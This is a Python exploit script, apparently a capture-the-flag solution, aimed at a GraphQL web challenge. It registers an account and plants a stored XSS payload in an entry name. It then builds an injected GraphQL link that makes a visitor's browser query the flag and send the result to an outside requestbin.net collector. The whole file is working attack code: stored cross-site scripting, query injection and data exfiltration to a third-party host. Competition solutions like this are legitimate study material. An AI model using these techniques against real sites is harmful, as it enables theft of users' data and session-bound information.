#!/usr/bin/env python3
import requests
import IPython
from urllib.parse import quote

URL = "http://e8a40537-7256-43da-a3b2-71730d1e812c.wtftime.tasteless.eu:10380/"
s = requests.session()

payload = '''
<img src=x onerror="(() => {
    query('{wtf(id: 1) {challs {flag}}}',{}).then(
        (e)=> fetch('http://requestbin.net/r/9zl882y9/' + JSON.stringify(e), {mode: 'no-cors'})
    ).catch(
        (e)=> fetch('http://requestbin.net/r/9zl882y9/' + JSON.stringify(e), {mode: 'no-cors'})
    );
})()"/>
'''

s.post(f"{URL}graphql", json={
    'query': '''mutation register($username: String, $password: String) {
        register(username:$username, password:$password)
    }''',
    'variables': {
        'username': 'foo',
        'password': 'bar'
    }
})

s.post(f"{URL}graphql", json={
    'query': '''mutation login($username: String, $password: String) {
            authenticate(username:$username, password:$password)
        }''',
    'variables': {
        'username': 'foo',
        'password': 'bar'
    }
})

postid = s.post(f"{URL}graphql", json={
    'query': '''mutation createWTF($name: String, $description: String) {
            createWTF(input: {name: $name, description: $description}) {
                id
            }
        }''',
    'variables': {
        'description': ".",
        'name': payload,
    }
}).json()['data']['createWTF']['id']

link = f'{URL}#wtf/{postid}' + '''){
description: name
name: description
challs { name points description }}foo: wtf(id: 1'''\
    .replace(' ', '%20')\
    .replace('\n', '%20')\
    .replace('{', '%7b')\
    .replace('}', '%7d')\
    .replace('(', '%28')\
    .replace(')', '%29')

print(link)